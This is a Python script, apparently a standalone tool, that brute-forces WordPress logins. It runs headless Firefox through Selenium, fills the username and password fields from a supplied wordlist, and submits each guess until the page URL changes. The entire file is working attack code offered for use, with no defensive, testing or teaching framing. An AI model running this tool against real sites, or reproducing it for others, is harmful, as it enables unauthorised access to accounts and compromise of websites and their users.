from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import sys, os, argparse, validators, termcolor, geckodriver_autoinstaller

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-l', '--login', help="Specify the WordPress login url")
arg_parser.add_argument('-u', '--user', help="Specify the WordPress username")
arg_parser.add_argument('-w', '--wordlist', help="Specify the wordlist for password bruteforce")
args = arg_parser.parse_args()

geckodriver_autoinstaller.install()

if not len(sys.argv) > 1:
	print('No arguments specified!')
	sys.exit()

options = Options()
options.headless = True

login_url = args.login
username = args.user
wordlist = args.wordlist

if login_url==None:
	print('ERROR: Login URL is not defined')
	sys.exit()

if not validators.url(login_url):
	print('ERROR: Login URL is malformed')
	sys.exit()

if wordlist==None:
    print('ERROR: Wordlist not defined')
    sys.exit()

if not os.path.isfile(wordlist):
    print('ERROR: Wordlist not found')
    sys.exit()
if username==None:
    print('ERROR: Username not defined')
    sys.exit()

banner = """
WordPress login bruteforce tool
"""

print(banner)

f = open(wordlist, 'r')
wordlist = f.read().strip()
f.close()
words = wordlist.split('\n')
passwords = []
for password in words:
	password = password.strip()
	if password!='':
		passwords.append(password)

print(termcolor.colored('[i]', 'blue')+' Fetching login page metadata...')

web = webdriver.Firefox(options=options)
web.get(login_url)
print(termcolor.colored('[i]', 'blue')+' Initiating bruteforce attack with {} password combinations\n'.format(len(passwords)))

i = 1
for password in passwords:
	web.find_element_by_css_selector('#user_login').send_keys(username)
	password_field = web.find_element_by_css_selector('#user_pass').send_keys(password)
	web.find_element_by_css_selector('#wp-submit').click()

	if (web.current_url==login_url):
		print(termcolor.colored('{}/{} Failed:'.format(i, len(passwords)), 'red')+' {}'.format(password))
		i+=1
	else:
		print(termcolor.colored('Password found: ', 'green')+ '{}\n'.format(password))
		web.quit()
		sys.exit()

web.quit()
print('Password not found\n')
sys.exit()